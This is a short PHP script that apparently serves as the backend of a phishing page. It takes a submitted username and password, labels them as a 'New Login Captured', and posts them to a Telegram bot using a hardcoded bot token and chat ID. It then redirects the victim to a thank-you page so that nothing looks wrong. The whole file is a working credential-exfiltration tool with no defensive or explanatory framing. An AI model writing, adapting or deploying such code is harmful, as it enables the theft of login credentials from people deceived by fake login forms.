<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = htmlspecialchars($_POST['username']);
    $password = htmlspecialchars($_POST['password']);

    // Format the message
    $message = "🔐 *New Login Captured*\n👤 Username: `$username`\n🔑 Password: `$password`";

    // Telegram Bot API Details
    $botToken = "7873119742:AAGPbwrxfIzspn7QTqWbBFbQFUM-uu_XsU8";
    $chatID = "6103934030";

    // Send message to Telegram
    $url = "https://api.telegram.org/bot$botToken/sendMessage";

    $postData = [
        'chat_id' => $chatID,
        'text' => $message,
        'parse_mode' => 'Markdown'
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);

    // Redirect after sending
    header("Location: thankyou.html");
    exit();
}
?>
